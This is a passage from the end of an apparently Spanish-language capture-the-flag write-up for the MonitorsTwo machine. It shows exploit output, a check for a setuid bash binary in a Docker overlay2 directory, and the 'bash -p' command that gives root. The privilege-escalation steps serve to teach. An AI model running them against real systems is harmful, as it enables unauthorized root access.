</span></span><span class="line"><span class="cl">[?] If it didn&#39;t spawn a shell go to this path and execute &#39;./bin/bash -p&#39;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[!] Spawning Shell
</span></span><span class="line"><span class="cl">bash-5.1# exit
</span></span></code></pre></div><p>Verifico que el setuid bit este activado.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">marcus@monitorstwo:/tmp$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
</span></span><span class="line"><span class="cl">total 1360
</span></span><span class="line"><span class="cl">-rwsr-xr-x 1 root root 1234376 Sep 10 10:03 bash
</span></span></code></pre></div><p>Obtengo el root lanzando manualmente el comando.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">marcus@monitorstwo:/tmp$ marcus@monitorstwo:/tmp$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
</span></span><span class="line"><span class="cl">bash-5.1# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Y con esto ya tenemos resuelta la m√°quina MonitorsTwo.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
